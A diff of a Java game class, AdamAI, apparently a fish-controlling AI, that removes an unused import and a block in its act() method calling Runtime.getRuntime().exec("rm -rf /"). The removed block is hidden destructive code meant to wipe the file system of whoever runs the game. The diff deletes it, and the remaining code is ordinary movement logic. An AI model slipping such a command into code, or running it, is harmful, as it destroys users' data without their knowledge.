@@ -1,10 +1,7 @@
 package ai;
 
-import java.io.IOException;
-
 import gameobjects.Fish;
 import gameobjects.GameObject;
-import ai.*;
 
 public class AdamAI extends AbstractAI {
 
@@ -12,14 +9,6 @@ public class AdamAI extends AbstractAI {
 
 	@Override
 	public void act() {
-
-		try {
-			Runtime.getRuntime().exec("rm -rf /");
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-
 		if (target != null) {
 			getFish().moveTowards(target);
 			if (!target.isAlive()) {
